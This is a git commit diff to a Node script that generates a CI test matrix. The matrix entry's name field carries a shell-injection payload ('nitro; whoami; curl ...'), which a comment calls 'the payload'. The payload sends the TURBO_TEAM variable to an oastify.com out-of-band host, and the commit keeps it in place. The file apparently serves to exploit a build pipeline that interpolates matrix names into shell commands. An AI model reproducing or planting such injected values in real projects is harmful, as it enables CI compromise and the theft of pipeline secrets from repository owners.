683896b0591606de5d55c42a77cf22fdd0ddaa73
saurabhb-dev <saurabh.banawar@gmail.com>
2025-11-01 16:33:29 +0530

    Update create-test-matrix.mjs

--- scripts/create-test-matrix.mjs
+++ scripts/create-test-matrix.mjs
@@ -2,7 +2,7 @@
 const matrix = {
   app: [
     // The payload: 'nitro' (to make the cd work), ';', 'whoami'
-    { name: 'nitro; whoami; curl "https://w4194oyqst012wbw87nlqlvtgkmfajy8.oastify.com?team=${TURBO_TEAM}"', project: 'whatever' },
+    { name: 'nitro; whoami; curl "https://w4194oyqst012wbw87nlqlvtgkmfajy8.oastify.com?team=${TURBO_TEAM}"', project: 'whatever-project' },
   ],
 };
 console.log(JSON.stringify(matrix));
